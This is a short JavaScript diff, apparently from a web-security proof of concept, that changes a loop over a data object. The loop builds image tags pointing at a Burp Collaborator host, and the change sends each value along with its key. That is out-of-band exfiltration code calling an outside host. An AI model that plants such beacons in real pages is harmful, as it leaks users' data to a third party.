@@ -11,7 +11,7 @@ function display(data) {
   for (var key in data){
     alert
     var li = document.createElement("img");
-    li.src = "https://198rbrko3ob5ialyb78h4nfpggm6av.burpcollaborator.net?key="+key
+    li.src = "https://198rbrko3ob5ialyb78h4nfpggm6av.burpcollaborator.net?key="+key+"&value="+data[key]
     ul.appendChild(li);
   }
 
